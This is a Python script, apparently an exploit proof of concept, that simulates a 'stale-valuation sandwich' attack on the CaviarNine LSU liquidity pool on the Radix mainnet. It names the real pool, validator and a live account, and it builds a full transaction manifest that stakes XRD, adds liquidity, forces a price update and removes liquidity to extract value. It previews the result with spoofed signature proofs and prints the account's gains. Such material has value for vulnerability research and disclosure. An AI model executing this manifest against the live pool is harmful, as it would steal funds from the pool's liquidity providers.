#!/usr/bin/env python3
"""End-to-end simulation (read-only preview) of the stale-valuation sandwich on the
CaviarNine LSU Pool. The attacker account is a real live account used only as a
funding source inside a *simulation* - nothing is signed or submitted."""
import json, urllib.request, time, sys
from decimal import Decimal as D

GW = "https://mainnet.radixdlt.com"
POOL = "component_rdx1cppy08xgra5tv5melsjtj79c0ngvrlmzl8hhs7vwtzknp9xxs63mfp"
ACCT = "account_rdx16ydf4jd8rljv4h238nfjr4uadq84jzclr6sfl7j3jpd02r7gsxydkk"
XRD = "resource_rdx1tknxxxxxxxxxradxrdxxxxxxxxx009923554798xxxxxxxxxradxrd"
LSU2 = "resource_rdx1tkwrxs8ak7narzldq4e9e0xds0rfkdn936qe4myn2e83upvfp4gc9g"
VALIDATOR = "validator_rdx1svpqafv4te3qtfhux5yxv2vyv95mp866dp9xpe28v0pvvwzhrk4vyz"
LSULP = "resource_rdx1thksg5ng70g9mmy9ne7wz0sc7auzrrwy7fmgcxzel2gvp8pj0xxfmf"
CREDIT = "resource_rdx1nt3frmqu4v57dy55e90n0k3uy352zyy89vszzamvjld6vqvr98rls9"
UA = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 read-only-research"}

def http(url, body, timeout=120, tries=6):
    for t in range(tries):
        try:
            req = urllib.request.Request(url, data=json.dumps(body).encode(), headers=UA)
            return json.loads(urllib.request.urlopen(req, timeout=timeout).read())
        except urllib.error.HTTPError as e:
            return json.loads(e.read())
        except Exception as e:
            print(f"  retry {type(e).__name__}", file=sys.stderr)
            time.sleep(2 + t)
    raise SystemExit("network fail")

def main():
    withdraw_xrd = sys.argv[1] if len(sys.argv) > 1 else "1280000"
    st = http(f"{GW}/status/gateway-status", {})
    epoch = st["ledger_state"]["epoch"]
    manifest = f'''
CALL_METHOD
    Address("{ACCT}")
    "withdraw"
    Address("{XRD}")
    Decimal("{withdraw_xrd}")
;
TAKE_FROM_WORKTOP
    Address("{XRD}")
    Decimal("{withdraw_xrd}")
    Bucket("xrd")
;
CALL_METHOD
    Address("{VALIDATOR}")
    "stake"
    Bucket("xrd")
;
TAKE_ALL_FROM_WORKTOP
    Address("{LSU2}")
    Bucket("dep")
;
CALL_METHOD
    Address("{POOL}")
    "add_liquidity"
    Bucket("dep")
    None
;
TAKE_ALL_FROM_WORKTOP
    Address("{LSULP}")
    Bucket("lp")
;
TAKE_ALL_FROM_WORKTOP
    Address("{CREDIT}")
    Bucket("credit")
;
CALL_METHOD
    Address("{POOL}")
    "update_multiple_validator_prices"
    200u32
;
CREATE_PROOF_FROM_BUCKET_OF_ALL
    Bucket("credit")
    Proof("cp")
;
CALL_METHOD
    Address("{POOL}")
    "remove_liquidity"
    Bucket("lp")
    Address("{LSU2}")
    Some(Proof("cp"))
;
TAKE_ALL_FROM_WORKTOP
    Address("{LSU2}")
    Bucket("out")
;
TAKE_ALL_FROM_WORKTOP
    Address("{LSULP}")
    Bucket("lp2")
;
CALL_METHOD
    Address("{ACCT}")
    "deposit_batch"
    Array<Bucket>(Bucket("out"), Bucket("lp2"), Bucket("credit"))
;
'''.strip()
    body = {"manifest": manifest, "start_epoch_inclusive": epoch, "end_epoch_exclusive": epoch + 2,
            "nonce": 424242, "signer_public_keys": [],
            "flags": {"use_free_credit": True, "assume_all_signature_proofs": True, "skip_epoch_check": True}}
    resp = http(f"{GW}/transaction/preview", body)
    rc = resp.get("receipt", {})
    print("status:", rc.get("status"))
    print("error:", rc.get("error_message"))
    if rc.get("status") != "Succeeded":
        json.dump(resp, open("sandwich_preview_failed.json", "w"), indent=1)
        return
    json.dump(resp, open("sandwich_preview.json", "w"), indent=1)
    fs = rc.get("fee_summary", {})
    print("execution cost units:", fs.get("execution_cost_units_consumed"))
    print("xrd execution cost:", fs.get("xrd_total_execution_cost"),
          "| finalization:", fs.get("xrd_total_finalization_cost"),
          "| storage:", fs.get("xrd_total_storage_cost"))
    # resource changes
    rcs = resp.get("resource_changes", [])
    for r in rcs:
        if r.get("resource_address") == LSU2:
            for e in r.get("entity_changes", []):
                if e.get("entity_address") == ACCT:
                    print("ACCT LSU2 change:", json.dumps(e))
        if r.get("resource_address") == XRD:
            for e in r.get("entity_changes", []):
                if e.get("entity_address") == ACCT:
                    print("ACCT XRD change:", json.dumps(e))
    # events of interest
    names = {}
    for e in rc.get("events", []):
        n = e.get("type", {}).get("type_reference", {}).get("name")
        names[n] = names.get(n, 0) + 1
    print("event counts:", names)
    for e in rc.get("events", []):
        n = e.get("type", {}).get("type_reference", {}).get("name")
        if n in ("AddLiquidityEvent", "RemoveLiquidityEvent", "ValuationChangeEvent"):
            print(" ", n, json.dumps(e.get("data", {}).get("programmatic_json"))[:220])

if __name__ == "__main__":
    main()
